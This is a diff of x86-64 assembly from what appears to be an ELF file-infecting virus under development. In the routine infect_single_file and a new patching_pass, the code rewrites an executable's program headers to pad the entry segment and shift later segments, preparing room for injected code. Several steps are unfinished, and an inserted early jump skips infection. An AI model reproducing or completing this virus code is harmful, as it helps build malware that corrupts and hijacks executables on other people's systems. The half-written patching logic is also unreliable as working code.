@@ -430,6 +430,9 @@ infect_single_file:
     pop rcx
     test rax, rax
     jz .close_munmap
+
+    ; NOTE: refactor to select last segment here
+    jmp exit_ok
     
 
     ; go to entry point offset in buffer, check if infected 
@@ -491,10 +494,11 @@ infect_single_file:
     call padding_pass
     pop rsi
 
-	; TODO: check this with ls
-    call break
-
     ; pass for updating offsets 
+    push rsi
+    mov rdi, r9
+    call patching_pass
+    pop rsi
 
     ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
     ; if smaller than _end - _start, (WAIT NO)
@@ -605,6 +609,95 @@ get_entry_offset:
     pop rbx
     ret
 
+; rdi - mmap buf
+; returns - entry change delta
+patching_pass:
+    push rbx
+    push r10 ; start offset to r10
+    push r9 ; mamp buf to r9
+    push r8 ; entry addr to r8
+
+
+    mov r9, rdi ; mmap buf -> r9
+
+    add rdi, 0x18
+    mov r8, qword [rdi] ; entry addr -> r8
+
+    mov rsi, rdi
+    add rdi, 0x28 ; pheader table addr -> rdi
+    
+    add rsi, 0x20
+    movzx rsi, word [rsi] ; phnum  -> rsi
+
+    mov rbx, 0
+
+; locate the pheader for entry
+.pheader_loop:
+    cmp rbx, rsi
+    jge .pheader_loop_end
+
+    ; vaddr -> rdx 
+    mov rdx, qword [rdi + 0x10]
+
+    ; vaddr + size -> rcx
+    mov rcx, qword [rdi + 0x20]
+    add rcx, rdx
+
+    ; check r8 should be entry vaddr
+    ; rdx should be vaddr of pheader
+    ; rcx should be vaddr of pheader + size
+	call break
+
+    ; if entry is bigger than pheader start + size, continue
+    cmp r8, rcx
+    jge .pheader_loop_iter ; NOTE: will there be an edge case here?
+
+	; if is lesser than pheader start, its in a subsequent pheader
+    cmp r8, rdx
+    jl .pheader_loop_subsequent_branch
+
+	; if its in range,
+    ; change filesize and memsize to add PAD_SZ
+    add qword [rdi + 0x20], MAX_FILE_PAD
+    add qword [rdi + 0x28], MAX_FILE_PAD
+
+
+
+    ; take note of start offset
+    mov r10, qword [rdi + 0x08] ; start offset -> r10
+
+    jmp .pheader_loop_iter
+
+; if it is a subsequent header
+.pheader_loop_subsequent_branch:
+    ; change offset to + PAD_SZ
+    add qword [rdi + 0x08], MAX_FILE_PAD
+
+    ; change vaddr too? NOTE: this may cause overlapping of virtual addresses
+
+.pheader_loop_iter:
+    add rbx, 1
+    add rdi, 0x38
+    jmp .pheader_loop
+
+.pheader_loop_end:
+
+	
+    ; locate section header for start offset
+
+    ; if section header in range, change its offset only 
+    
+
+
+    ; change entry address and return the delta
+
+
+.ret:
+    pop r8
+    pop r9
+    pop r10
+    pop rbx
+    ret
 
 ; rdi - mmap buf
 ; rsi - file size
@@ -677,7 +770,6 @@ padding_pass:
     add rdx, r10
     sub rdx, MAX_FILE_PAD
     call mempad
-    call break
 
 
 .ret:
